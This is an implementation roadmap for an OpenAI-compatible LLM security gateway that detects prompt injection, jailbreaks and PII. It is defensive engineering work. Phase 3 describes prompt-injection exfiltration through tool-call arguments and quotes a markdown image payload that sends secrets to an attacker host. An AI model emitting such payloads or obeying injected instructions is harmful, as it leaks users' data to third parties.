# 19 — Implementation Roadmap

Eight phases. Each specifies objective, components, expected files, dependencies, tasks,
tests, acceptance criteria, definition of done, and risks — detailed enough that another
engineer can implement it without redesigning the system.

**A phase is done when its acceptance criteria are demonstrable by a command someone else can
run**, not when its tasks are ticked.

## Status

| Phase | Title | State |
|---|---|---|
| 0 | Foundation and vertical slice | **Substantially complete** — foundation and vertical slice built and verified; eval harness and metrics outstanding |
| 1 | OpenAI-compatible gateway | Not started |
| 2 | Input security (ML detectors) | **Model selected and re-validated on a 457-sample independent hold-out** ([ADR-014](adr/ADR-014-detector-selection.md)). **Fine-tuning protocol pre-registered** ([ADR-015](adr/ADR-015-fine-tuning-strategy.md)); corpus built, no training run. Blocking still closed (`eval/results/20260817T102936Z__threshold-deployability/`) |
| 3 | Output security | Not started |
| 4 | Evaluation and benchmarking | **Framework built and validated**; corpus gaps remain (OD-17) |
| 5 | Observability and operations | Not started |
| 6 | Hardening | Not started |
| 7 | Deployment | Not started |

**Detector-quality evaluation has been run** on an 11,009-sample benchmark; results are
in `eval/results/` and summarised in [ADR-014](adr/ADR-014-detector-selection.md).
They are **internal benchmark results**, not published project metrics.

**Latency and throughput benchmarking of the gateway has NOT been run.** Every
gateway-overhead figure still reads `pending benchmark execution`; the detector-level
latencies in `eval/results/` are a different measurement
(docs/15-performance-benchmarking.md).

## Sequencing rationale

* **Gateway before detection** — a detector on an unreliable proxy is untestable.
* **Harness in Phase 0, benchmarks in Phase 4** — Phase 2 must be measurable the moment it
  lands, or its model choice is a guess.
* **Evaluation before optimisation** — profile, then optimise. Phase 4 exists so Phase 6 has
  numbers to act on.
* **Observability after the data model** — dashboards built over a moving schema get rebuilt.
* **Streaming late** — the hardest correctness problem in the system, and worthless without
  Phase 3's output detectors.
* **Kubernetes last and conditional** — local Compose must work first.

---

# Phase 0 — Foundation and vertical slice

**Objective.** A repository where every architectural claim in `docs/` is load-bearing in
code, `docker compose up` works with no credentials, and one request path is proven end to
end. **Not** a features phase: it ships one uncalibrated heuristic detector and says so.

**Depends on:** nothing.

### Components
`app/core`, `app/config`, `app/detectors` (+ heuristic injection, regex PII, two stubs),
`app/policy`, `app/gateway`, `app/api`, `app/middleware`, `app/observability`, `app/database`,
`services/mock_upstream`, `eval/` skeleton, Docker/Compose, CI.

### Expected files

```
pyproject.toml  uv.lock  .env.example  .pre-commit-config.yaml  LICENSE  README.md
app/main.py
app/core/{types,normalize,ids,exceptions}.py
app/config/{settings,policy,loader}.py
app/detectors/{base,guarded,registry,pipeline}.py
app/detectors/injection/heuristic.py   app/detectors/pii/regex.py
app/detectors/jailbreak/stub.py        app/detectors/output/stub.py
app/policy/{engine,redaction}.py
app/gateway/{openai_schema,translate,upstream}.py
app/api/{health,ready,metrics,errors}.py  app/api/v1/chat.py
app/middleware/{request_id,body_limit,timing,headers}.py
app/observability/{logging,metrics,tracing}.py
app/models/events.py
app/database/{models,session,repository}.py
migrations/env.py  migrations/versions/0001_initial.py
services/mock_upstream/main.py
eval/datasets/{registry.yaml,splits.py,smoke/cases.jsonl}
eval/runners/{in_process.py,run.py}  eval/metrics/{classification,report}.py
scripts/capture_machine_metadata.py
deploy/docker/{Dockerfile,Dockerfile.mock,.dockerignore}  compose.yaml
.github/workflows/ci.yml
tests/{unit,api,security,integration,evaluation}/...
```

### Tasks

| # | Task | Status | Notes |
|---|---|---|---|
| 0.1 | Bootstrap: `.gitignore`, Apache-2.0 LICENSE, `pyproject.toml`, `uv lock`, pre-commit | **Done** | 123 packages locked; Apache over MIT for the patent grant |
| 0.2 | `app/core` | **Done** | Frozen models; index-preserving normalisation ([ADR-010](adr/ADR-010-normalization-strategy.md)) |
| 0.3 | `app/config` | **Done** | Two systems, secret-key validator, `policy_version` ([ADR-011](adr/ADR-011-configuration-model.md)) |
| 0.4 | Detector layer | **Done** | Protocol, `GuardedDetector`, `SyncDetectorAdapter`, registry, pipeline |
| 0.5 | Heuristic injection + jailbreak + regex PII | **Done** | Three baseline detectors; one output-policy stub remains for Phase 3 |
| 0.6 | Policy engine + redaction | **Done** | Pure; truth table in `tests/unit/test_policy_engine.py` |
| 0.7 | Gateway: schema, translate, upstream client | **Done** | Pooled client in lifespan; upstream is a Protocol so tests can count calls |
| 0.8 | API + middleware + app factory | **Done** | Health/ready, real `/v1/chat/completions`, request-id, body limit, security headers, error envelope |
| 0.9 | Mock upstream service | **Done** | `MOCK_LATENCY_MS`, behaviour triggers, and a `/__stats` call counter for the upstream invariant |
| 0.10 | Database models + Alembic initial migration + repository | **Done** | Three tables, migration applied/rolled back/re-applied against real PostgreSQL. `policy_decisions` and evaluation tables still deferred |
| 0.11 | Observability: structlog, redaction processor, metrics, span helpers | **Partial** | Logging, sink-level redaction and per-stage timings done; Prometheus `/metrics` and OTel spans outstanding |
| 0.12 | Dockerfile (multi-stage, non-root) + compose (Postgres on host **5434**) | **Done** | Digest-pinned base, read-only rootfs, `cap_drop: ALL` |
| 0.13 | Eval harness skeleton + 40-case smoke set | **Partial** | 31-case fixture and plumbing tests exist; the runner, metrics module and report writer are outstanding |
| 0.14 | CI workflow | **Done** | 7 jobs, all blocking |
| 0.15 | README with honest status table | **Done** | Every metric `pending benchmark execution` |
| 0.16 | Self-review pass | **Done** | Findings in the response record; two real bugs fixed |

**Schema scope.** Three tables are created — `request_traces`, `detector_results`,
`security_events` — the minimum that lets an operator reconstruct what happened.
`policy_decisions` and the evaluation tables in [11-data-model.md](11-data-model.md) remain
deferred: nothing writes them yet, and a table nobody writes is schema nobody can justify.

### Tests
`tests/unit/`: policy truth table, config precedence, secret-key rejection, normalisation +
offsets + evasion classes, guarded detector timeout/exception, sync adapter, heuristic, PII
spans, layer boundaries, no-content-columns.
`tests/api/`: health, ready, metrics, chat happy path, malformed, oversized, `stream:true`,
error envelope, request-id.
`tests/security/`: block, block-response disclosure, redaction both directions, fail-closed,
fail-open, **log-leak canary**, secret leakage, log injection, upstream body leak.
`tests/integration/`: end-to-end through containers, audit persistence, audit failure.
`tests/evaluation/`: splits, metrics, report schema, runner.

### Acceptance criteria
1. `docker compose up` on a clean machine, no credentials, no egress → `/health` and `/ready`
   return 200.
2. Benign request → completion. Injection request → `403` with category only. Email in request
   → forwarded with `<EMAIL_REDACTED>`. Each proven by a test **and** a documented `curl`.
3. `ruff`, `mypy --strict`, and unit/api/security suites green locally and in CI.
4. `alembic upgrade head` creates the schema; a blocked request persists trace + detector
   results + policy decision + security event, with correct `policy_version`.
5. Canary test proves no prompt content in any log record at default configuration.
6. Eval harness emits a metadata-stamped report on the smoke set, self-labelled a wiring test.
7. No unbacked metric anywhere in the repository.

### Definition of done
All acceptance criteria demonstrable from a fresh clone; every ADR's Verification section
checkable against the code; self-review findings fixed or recorded in
[21-open-decisions.md](21-open-decisions.md).

### Risks
Scope creep into Phase 2 (mitigate: stubs stay stubs, no threshold tuning without evaluation)
· truth-table test becoming unmaintainable (mitigate: parametrised, not enumerated) ·
smoke set mistaken for a benchmark (mitigate: the report prints the disclaimer).

---

# Phase 1 — OpenAI-compatible gateway

**Objective.** Make the proxy trustworthy for real clients: full contract, correct error
taxonomy, no silent semantic changes.

**Depends on:** Phase 0 (pipeline, upstream client, error envelope).

### Components
`app/gateway/*` extended, `app/api/v1/*`, `services/mock_upstream` extended.

### Expected files
`app/api/v1/models.py`, `app/gateway/retry.py`, `tests/integration/test_openai_sdk.py`,
`tests/api/test_multi_choice.py`, `tests/contract/test_real_provider.py` (opt-in).

### Tasks

| # | Task | Notes |
|---|---|---|
| 1.1 | `GET /v1/models` proxied with a short cache | Do not poll upstream per client startup |
| 1.2 | Full field pass-through incl. unknown fields | FR-002 |
| 1.3 | `n > 1`: inspect **every** choice | Common gap in naive implementations |
| 1.4 | Upstream error taxonomy: 429 + `Retry-After`, context-length, 4xx/5xx | Body never reflected |
| 1.5 | Bounded retry with jittered backoff on connect errors and 429 | **Never retry a blocked request**; never blindly retry non-idempotent calls |
| 1.6 | Timeout budget propagation | Total bounded |
| 1.7 | Opt-in real-provider contract test | Credential-gated, excluded from default CI ([ADR-009](adr/ADR-009-mock-upstream.md) drift risk) |
| 1.8 | OpenAI SDK integration test | FR-001 |

### Tests
`test_models.py`, `test_passthrough.py`, `test_multi_choice.py`, `test_upstream_failures.py`,
`test_retry.py` (including "blocked requests are never retried"), `test_openai_sdk.py`.

### Acceptance criteria
An unmodified OpenAI SDK application works against the gateway for every non-streaming feature
it used before; all upstream failure classes map correctly with no body reflection; retries
are bounded and never applied to blocked requests.

### Definition of done
Acceptance criteria met; `07-openai-compatible-api.md` updated from "intended" to "tested"
for each verified row.

### Risks
Contract drift against real providers (mitigate: opt-in real-provider test) · retry
amplification under upstream failure (mitigate: bounded attempts + jitter + circuit-breaker
consideration recorded in [21-open-decisions.md](21-open-decisions.md)).

---

# Phase 2 — Input security (ML detectors)

**Objective.** Replace the heuristic baseline with measured ML detection — and publish the
delta, whatever it is.

**Depends on:** Phase 1; **Phase 0's eval harness**; a dev split from Phase 4 dataset work
(this phase and 4.1–4.4 interleave).

### Components
`app/detectors/injection/transformer.py`, `app/detectors/jailbreak/*`,
`app/detectors/pii/presidio.py`, model download/verification scripts.

### Expected files
`app/detectors/injection/transformer.py`, `app/detectors/jailbreak/transformer.py`,
`app/detectors/pii/presidio.py`, `scripts/download_models.py`,
`docs/adr/ADR-013-...` *(model selection — number assigned when written)*.

### Tasks

| # | Task | Notes |
|---|---|---|
| 2.1 | Model survey and selection | Candidates: DeBERTa-v3-based injection classifiers, Llama-Guard-class, distilled classifiers. Criteria: licence, size, CPU latency, **measured performance on our splits — not the model card's numbers**. Recorded as an ADR |
| 2.2 | ONNX export + `onnxruntime` inference; evaluate int8 quantisation | Avoids torch in the runtime image; materially faster on CPU |
| 2.3 | `injection.transformer` via `SyncDetectorAdapter`; `warmup()` at startup | Model pinned **by revision digest**, `safetensors` only, checksum verified (T-23) |
| 2.4 | Jailbreak detector as a separate category | Keeps per-category recall visible |
| 2.5 | Presidio PII detector behind the same interface | `sm` vs `lg` measured ([08](08-pii-security.md)) |
| 2.6 | Layer-1 short-circuit | Heuristic may short-circuit to BLOCK **only**, never to ALLOW |
| 2.7 | Threshold selection from the dev-split sweep | Tuned on `dev`, reported on `test` |
| 2.8 | Optional GPU path | RTX 3050 fits a base classifier; CPU stays default so the container runs anywhere |

### Tests
`test_transformer_detector.py` (with a tiny fixture model), `test_jailbreak.py`,
`test_pii_presidio.py`, `test_model_integrity.py` (digest/checksum), `test_warmup_gates_ready.py`,
`test_no_event_loop_blocking.py`.

### Acceptance criteria
1. A committed evaluation report showing the classifier's delta over `injection.heuristic` on
   the same split, with its latency cost.
2. Thresholds chosen from a published curve; tuned on `dev`, reported on `test`.
3. Detector warm-up gates `/ready`; no event-loop blocking under concurrent load.
4. Models pinned by digest and verified on download.

### Definition of done
Acceptance criteria met **and** — if the classifier does not beat the heuristic baseline, that
result is published and the phase does not pass by shipping it anyway.

### Risks
Public benchmark contamination inflating results (mitigate: hold-out hand-authored set,
reported as a validity threat) · image size and memory growth (mitigate: ONNX, extras,
measured) · latency regression (mitigate: Phase 4 conditions re-run before and after) ·
4 GB VRAM insufficient for a chosen model (mitigate: CPU is the default path).

---

# Phase 3 — Output security

**Objective.** Close the exfiltration channels that output inspection exists for.

**Depends on:** Phase 2 (detector patterns), Phase 1 (multi-choice handling).

### Components
`app/detectors/output/*` (PII reuse, disclosure, tool-call, URL).

### Expected files
`app/detectors/output/{disclosure,tool_calls,urls,policy}.py`,
`tests/security/test_output_exfiltration.py`.

### Tasks

| # | Task | Notes |
|---|---|---|
| 3.1 | Output PII detection + span redaction | Same detector, output configuration |
| 3.2 | System-prompt disclosure detection | Similarity against the request's own system message |
| 3.3 | **Tool-call argument inspection** | The real exfiltration channel: a successful injection makes the model *call a tool* with stolen data rather than print it (FR-021) |
| 3.4 | **Markdown link/image URL inspection** | `![](https://attacker/?d=<secrets>)` renders in a chat UI and performs a GET. Domain allowlist + payload-in-URL heuristics |
| 3.5 | Output policy detector | Configurable categories; explicitly not a general content-moderation product |
| 3.6 | Malformed upstream response handling | Fails safe rather than propagating |

### Tests
`test_output_pii.py`, `test_disclosure.py`, `test_output_exfiltration.py` (tool-call and URL
cases), `test_malformed_upstream_response.py`.

### Acceptance criteria
Output-side block and redact demonstrated end to end; tool-call and URL exfiltration cases in
`tests/security/`; output detection quality measured **separately** from input in the
evaluation report.

### Definition of done
Acceptance criteria met; T-09 and T-10 in [09-threat-model.md](09-threat-model.md) move from
*Planned* to *Partial* with evidence.

### Risks
False positives on legitimate URLs and tool calls (mitigate: allowlist, WARN-first rollout) ·
disclosure detection producing false positives on legitimate summarisation (mitigate: measured
FPR before enabling BLOCK).

---

# Phase 4 — Evaluation and benchmarking

**Objective.** Produce the numbers every other claim in this project depends on.

**Depends on:** Phases 2 and 3 (there must be something worth measuring); Phase 0 harness.

### Components
`eval/datasets/*`, `eval/runners/benchmark.py`, `eval/metrics/*`, `eval/reports/*`.

### Expected files
`scripts/datasets/<slug>.py` per dataset, `eval/runners/{http,benchmark}.py`,
`eval/metrics/latency.py`, `eval/reports/<run_id>.{json,md}`.

### Tasks

| # | Task | Notes |
|---|---|---|
| 4.1 | Dataset sourcing + **licence verification** | Anything failing verification is dropped **and recorded as dropped** ([14](14-dataset-strategy.md)) |
| 4.2 | Large benign corpus | The FPR denominator — hardest and most important sourcing task |
| 4.3 | Hand-authored indirect-injection set | Public data is thin here; ours, documented |
| 4.4 | Normalisers → case schema, stable `sample_id`s | Splits must never move |
| 4.5 | Detection benchmark | Precision/recall/F1/FPR/FNR, per-category recall, AUROC/AUPRC, Wilson intervals, threshold sweeps, all baselines |
| 4.6 | Latency benchmark, conditions A–D | [15](15-performance-benchmarking.md) |
| 4.7 | Throughput at concurrency 1/4/16/64 with error rates | |
| 4.8 | Error analysis over per-case results | The part that actually improves detectors |
| 4.9 | Publish; replace placeholders with cited figures **and conditions** | |

### Tests
`test_metrics.py` against hand-computed confusion matrices, `test_determinism.py`,
`test_registry.py` (checksum enforcement), `test_report_refuses_without_metadata.py`.

### Acceptance criteria
1. Every dataset registered with verified licence and checksum; none committed.
2. Detection and latency reports committed, each carrying dataset checksum, git commit,
   configuration, machine metadata and `n`.
3. Reproducing a run from the same commit and checksum yields identical classification
   metrics.
4. Every `pending benchmark execution` placeholder either replaced with a cited figure or
   still honestly marked pending.

### Definition of done
Acceptance criteria met; [22-evidence-and-claims.md](22-evidence-and-claims.md) rows move to
*Evidence produced* with report paths.

### Risks
No suitable licensed benign corpus (mitigate: author one; report the limitation) · results
worse than hoped (mitigate: publish anyway — that is the methodology working) · benchmark
contamination (mitigate: hold-out set) · laptop-class machine (mitigate: relative overhead
only, machine metadata attached).

---

# Phase 5 — Observability and operations

**Objective.** Make the system operable by someone who did not build it.

**Depends on:** Phase 4 (dashboards need real numbers and a settled schema).

### Components
Async audit writer, retention job, OTLP exporter, dashboards, alerts, runbook.

### Expected files
`app/database/writer.py`, `app/database/retention.py`, `app/observability/exporters.py`,
`dashboard/app.py`, `deploy/grafana/*.json`, `deploy/alerts/*.yaml`, `docs/runbook.md`.

### Tasks

| # | Task | Notes |
|---|---|---|
| 5.1 | Bounded-queue audit writer + background task | Drops counted; **never unbounded** ([ADR-012](adr/ADR-012-persistence-and-retention.md)) |
| 5.2 | Retention deletion job | Enforces the documented policy |
| 5.3 | OTLP exporter wiring | Langfuse on host **3001** (3000 occupied); content-free spans |
| 5.4 | Grafana dashboards as code | |
| 5.5 | Streamlit security dashboard | Built **after** the data model, per the brief |
| 5.6 | Alert rules | Detector errors, audit failures, block-rate step change |
| 5.7 | Runbook | One entry per alert |

### Tests
`test_writer_backpressure.py` (queue full → drop + metric, no OOM), `test_retention.py`,
`test_span_attributes.py` (no content keys), `test_dashboard_queries.py`.

### Acceptance criteria
Audit writes off the request path with measured latency improvement; retention enforced
automatically; traces exported with verified content-free attributes; an operator can answer
"what is being blocked, why, how expensive is it, is anything degraded" without reading raw
logs.

### Definition of done
Acceptance criteria met; runbook covers every alert; dashboard queries run against the real
schema.

### Risks
Dashboard becoming the project's focus (mitigate: it is downstream of the data model, not
upstream) · async writer hiding failures (mitigate: drop counter is an alerting metric).

---

# Phase 6 — Hardening

**Objective.** Close the two largest functional gaps (streaming, rate limiting) and find out
what breaks under adversarial pressure.

**Depends on:** Phase 3 (output detectors — streaming inspection is pointless without them),
Phase 4 (a latency baseline to compare TTFT against).

### Components
Streaming inspection, rate limiter, policy hot-reload, load/soak harness, red-team loop.

### Expected files
`app/gateway/streaming.py`, `app/middleware/rate_limit.py`, `app/config/reload.py`,
`eval/runners/redteam.py`, `eval/reports/loadtest-*.md`.

### Tasks

| # | Task | Notes |
|---|---|---|
| 6.1 | **Streaming inspection** — sliding window, bounded lookahead | Ships only with measured TTFT cost, `leaked_prefix_tokens` per block event, and a published detection delta vs non-streaming ([03](03-request-response-flow.md), [07](07-openai-compatible-api.md)) |
| 6.2 | Rate limiting per client/tenant, sliding window, `Retry-After` | T-18 |
| 6.3 | Policy hot-reload, atomic swap, version change audited | |
| 6.4 | Load and soak testing | Saturation, memory stability, detector-timeout cascade |
| 6.5 | **Adversarial red-team loop** | Generate attacks against *this* deployment rather than replaying a static corpus; publish the bypass rate. The highest-value methodological upgrade available |
| 6.6 | Container hardening review, distroless evaluation, SBOM | |
| 6.7 | Multi-worker tuning | Measures the GIL ceiling from [ADR-001](adr/ADR-001-technology-stack.md) |

### Tests
`test_streaming_inspection.py` (block mid-stream, leaked-prefix accounting), `test_rate_limit.py`,
`test_hot_reload.py` (no mid-request policy change), soak test in CI-optional form.

### Acceptance criteria
Streaming supported **honestly** with published TTFT cost and detection delta; rate limiting
active with correct headers; hot-reload without mid-request inconsistency; load/soak results
published; red-team bypass rate published.

### Definition of done
Acceptance criteria met; `07` streaming row updated; T-18 moves from *Planned* to *Mitigated*;
T-15 residual risk restated with red-team evidence.

### Risks
Streaming inspection weaker than expected (mitigate: publish the delta, do not hide it) ·
red-team loop needing an LLM in the harness (acceptable — offline only, never the request
path) · hot-reload race conditions (mitigate: atomic swap, immutable config objects).

---

# Phase 7 — Deployment

**Objective.** A documented, reproducible deployment path with sizing grounded in measurement.

**Depends on:** Phases 4 (sizing numbers) and 6 (hardening).

### Components
Production image, optional Kubernetes manifests, CD pipeline, deployment guide.

### Expected files
`deploy/k8s/*.yaml` (conditional), `deploy/helm/*` (conditional),
`.github/workflows/release.yml`, `docs/17-deployment-architecture.md` updated with real sizing.

### Tasks

| # | Task | Notes |
|---|---|---|
| 7.1 | Production image: digest-pinned, SBOM, signed if the registry supports it | |
| 7.2 | Kubernetes manifests **only if justified** | Deployment, Service, probes on `/ready`, PDB, HPA, resources, **NetworkPolicy enforcing T-14** |
| 7.3 | Helm chart only if manifests prove repetitive | |
| 7.4 | CD pipeline: build → scan → sign → publish → migrate → rolling update | No credentials in this repository |
| 7.5 | Deployment guide with sizing from Phase 4 | |
| 7.6 | Native provider adapters if demand justifies the translation layer | |

### Tests
`test_container_posture.py` (non-root, read-only FS, dropped caps), manifest lint, a smoke
deploy in a local cluster.

### Acceptance criteria
Reproducible image build with SBOM and scan; deployment path documented end to end including
rollback; sizing guidance cites Phase 4 reports; NetworkPolicy (or documented equivalent)
enforces that the application cannot reach the upstream directly.

### Definition of done
A competent operator can deploy, scale, upgrade and roll back from the documentation alone.

### Risks
Kubernetes complexity without need (mitigate: conditional, Compose remains the reference) ·
sizing guidance outliving the measurements it cites (mitigate: every figure cites its report
and machine).

---

## Cross-phase dependency map

```
        ┌────────── Phase 0 (foundation + harness skeleton) ──────────┐
        │                                                             │
        ▼                                                             ▼
    Phase 1 (gateway) ──► Phase 2 (input ML) ──► Phase 3 (output) ──► Phase 4 (evaluation)
                               ▲                                       │
                               └────── dataset dev split ──────────────┘
                                                                       ▼
                                                   Phase 5 (observability) ──► Phase 6 (hardening) ──► Phase 7 (deploy)
```

The one genuine interleave is **Phase 2 ↔ Phase 4.1–4.4**: model selection needs a dev split,
and the dev split is dataset work belonging to Phase 4. Datasets are therefore prepared during
Phase 2 and the *benchmark reporting* happens in Phase 4 — recorded here so it is a planned
overlap rather than a surprise.

## Next implementation task

**Detector/model selection and evaluation-design validation** — not Phase 1, and not more
features.

The vertical slice is complete and every interface is proven by a real detector, so the
binding constraint is no longer architecture: it is that **detection quality is entirely
unmeasured**. The baseline heuristics exist to be beaten, and choosing what beats them
requires evidence, not a model card. Prerequisites and the exact scope are in
[21-open-decisions.md](21-open-decisions.md) (OD-1, OD-3, OD-5).
